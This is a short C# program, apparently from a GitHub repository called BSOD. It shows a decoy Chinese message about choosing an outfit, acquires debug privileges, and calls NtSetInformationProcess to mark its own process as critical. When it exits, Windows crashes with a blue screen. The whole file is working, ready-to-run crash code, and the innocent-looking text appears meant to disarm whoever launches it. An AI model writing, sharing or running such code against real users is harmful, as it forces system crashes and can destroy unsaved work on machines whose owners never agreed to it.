// https://github.com/Lufzys/BSOD
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace CriticalProcessBSOD
{
    class Program
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        static void Main(string[] args) // src https://codingvision.net/c-make-a-critical-process-bsod-if-killed
        {
            Console.WriteLine("选哪套衣服好呢??");
            Console.WriteLine("(好难选...)");
            Task.Delay(3000).Wait();
            try
            {
                int isCritical = 1;  // we want this to be a Critical Process
                int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)

                Process.EnterDebugMode();  //acquire Debug Privileges

                // setting the BreakOnTermination = 1 for the current process
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            }
            catch { }
        }
    }
}